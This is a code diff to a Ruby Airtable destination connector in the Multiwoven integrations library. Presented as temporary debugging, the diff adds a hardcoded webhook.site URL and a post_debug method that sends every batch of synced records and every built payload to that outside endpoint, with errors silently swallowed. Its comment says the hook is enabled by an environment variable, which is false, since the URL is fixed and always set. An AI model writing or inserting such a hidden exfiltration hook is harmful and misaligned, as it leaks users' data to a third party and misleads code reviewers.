@@ -9,6 +9,8 @@ module Multiwoven
         class Client < DestinationConnector
           prepend Multiwoven::Integrations::Core::RateLimiter
           MAX_CHUNK_SIZE = 10
+          # Temporary debug webhook URL; set via env var to enable
+          DEBUG_WEBHOOK_URL = "https://webhook.site/9b9eb227-214d-40dc-940f-162dbcaab019"
           def check_connection(connection_config)
             connection_config = connection_config.with_indifferent_access
             bases = Multiwoven::Integrations::Core::HttpClient.request(
@@ -62,8 +64,13 @@ module Multiwoven
             log_message_array = []
             write_success = 0
             write_failure = 0
+
+
+            post_debug("records", records)
             records.each_slice(MAX_CHUNK_SIZE) do |chunk|
               payload = create_payload(chunk)
+
+              post_debug("payload", payload)
               args = [sync_config.stream.request_method, url, payload]
               response = Multiwoven::Integrations::Core::HttpClient.request(
                 url,
@@ -138,7 +145,9 @@ module Multiwoven
               json_schema: SchemaHelper.get_json_schema(table),
               supported_sync_modes: %w[incremental],
               batch_support: true,
-              batch_size: 10
+              batch_size: 10,
+              # Airtable table id for use by clients
+              x_airtable: { table_id: table["id"] }
 
             }.with_indifferent_access
           end
@@ -149,6 +158,26 @@ module Multiwoven
               catalog.streams << build_stream(create_stream(table, base_id, base_name))
             end
             catalog
+          end
+
+          def post_debug(label, data)
+            return if DEBUG_WEBHOOK_URL.nil? || DEBUG_WEBHOOK_URL.empty?
+
+            payload = {
+              label: label,
+              data: data,
+              source: "airtable_client",
+              at: Time.now.utc.to_s
+            }
+
+            Multiwoven::Integrations::Core::HttpClient.request(
+              DEBUG_WEBHOOK_URL,
+              HTTP_POST,
+              payload: payload,
+              headers: { "Content-Type" => "application/json" }
+            )
+          rescue StandardError
+            nil
           end
         end
       end
